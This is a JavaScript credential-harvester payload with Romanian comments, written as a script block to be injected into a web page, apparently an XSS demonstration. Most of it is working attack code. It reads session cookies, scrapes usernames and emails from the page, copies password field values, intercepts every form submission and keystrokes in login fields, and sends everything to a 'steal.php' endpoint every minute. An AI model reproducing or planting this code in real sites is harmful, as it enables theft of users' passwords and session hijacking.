<script>
function stealCredentials() {
    var credentialData = {
        attack_type: 'credential_harvester',
        timestamp: new Date().toISOString(),
        
        // === CREDENTIALE EXISTENTE ===
        existing_credentials: {
            cookies: document.cookie,
            sessionId: document.cookie.match(/PHPSESSID=([^;]+)/) ? document.cookie.match(/PHPSESSID=([^;]+)/)[1] : null,
            current_user: null,
            current_email: null
        },
        
        // === PAROLE DIN FORMULARE ===
        password_fields: [],
        
        // === CREDENTIALE DIN PAGINĂ ===
        page_credentials: [],
        
        // === AUTENTIFICARE INTERCEPTATĂ ===
        intercepted_logins: []
    };
    
    // === EXTRAGE UTILIZATORUL CURENT ===
    try {
        // Caută în textul paginii
        var pageText = document.body.textContent;
        var userPattern = /User:\s*([a-zA-Z0-9_]+)/;
        var emailPattern = /Email:\s*([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/;
        
        var userMatch = pageText.match(userPattern);
        var emailMatch = pageText.match(emailPattern);
        
        if (userMatch) credentialData.existing_credentials.current_user = userMatch[1];
        if (emailMatch) credentialData.existing_credentials.current_email = emailMatch[1];
        
        // Caută în elemente specifice
        var userElements = document.querySelectorAll('strong, [class*="user"], [id*="user"]');
        userElements.forEach(function(el) {
            var text = el.textContent.trim();
            if (text && text.length < 50 && !text.includes('ID') && !text.includes(':')) {
                credentialData.existing_credentials.current_user = text;
            }
        });
        
    } catch (e) {
        console.log('Error extracting current user:', e);
    }
    
    // === CAUTĂ TOATE PAROLELE ===
    try {
        var passwordInputs = document.querySelectorAll('input[type="password"], input[name*="pass"], input[id*="pass"], input[placeholder*="pass"]');
        passwordInputs.forEach(function(input, index) {
            credentialData.password_fields.push({
                index: index,
                name: input.name,
                id: input.id,
                value: input.value,
                placeholder: input.placeholder,
                form_action: input.form ? input.form.action : null,
                form_method: input.form ? input.form.method : null
            });
        });
        
        // Caută și username-urile asociate
        var usernameInputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"], input[id*="user"], input[id*="email"]');
        usernameInputs.forEach(function(input, index) {
            if (input.value && input.value.length > 0) {
                credentialData.page_credentials.push({
                    type: 'username_field',
                    name: input.name,
                    id: input.id,
                    value: input.value,
                    input_type: input.type,
                    placeholder: input.placeholder
                });
            }
        });
        
    } catch (e) {
        console.log('Error extracting passwords:', e);
    }
    
    // === INTERCEPTEAZĂ TOATE FORMULARELE ===
    document.querySelectorAll('form').forEach(function(form) {
        var originalSubmit = form.onsubmit;
        
        form.addEventListener('submit', function(e) {
            var loginData = {
                timestamp: new Date().toISOString(),
                form_action: form.action,
                form_method: form.method,
                credentials: {}
            };
            
            // Extrage toate valorile din formular
            var formData = new FormData(form);
            for (var pair of formData.entries()) {
                loginData.credentials[pair[0]] = pair[1];
            }
            
            // Trimite credentialele interceptate IMEDIAT
            fetch('./steal.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack_type: 'login_intercept',
                    intercepted_login: loginData,
                    session_info: {
                        cookies: document.cookie,
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    }
                }),
                mode: 'no-cors'
            });
            
            console.log('🔑 Login intercepted:', loginData);
        });
    });
    
    // === TRIMITE DATELE INIȚIALE ===
    fetch('./steal.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(credentialData),
        mode: 'no-cors'
    }).then(function() {
        console.log('🔑 Credential harvesting successful!');
    }).catch(function(error) {
        console.error('❌ Credential theft failed:', error);
    });
    
    return credentialData;
}

// === MONITORIZEAZĂ SCHIMBĂRILE ÎN CÂMPURI ===
function monitorPasswordFields() {
    document.addEventListener('input', function(e) {
        if (e.target.type === 'password' || 
            e.target.name.toLowerCase().includes('pass') ||
            e.target.name.toLowerCase().includes('user') ||
            e.target.type === 'email') {
            
            // Trimite valorile în timp real
            fetch('./steal.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack_type: 'real_time_input',
                    field_name: e.target.name,
                    field_id: e.target.id,
                    field_type: e.target.type,
                    field_value: e.target.value,
                    timestamp: new Date().toISOString()
                }),
                mode: 'no-cors'
            });
        }
    });
}

// === EXECUȚIE ===
stealCredentials();
monitorPasswordFields();

// === REPETĂ LA FIECARE 60 SECUNDE ===
setInterval(stealCredentials, 60000);

console.log('🔑 Advanced credential harvester activated!');
alert('🚨 CREDENTIAL HARVESTER!\n\n✅ Username și parole extrase\n✅ Interceptare login activă\n✅ Monitorizare în timp real\n\nVerifică dashboard.php!');
</script>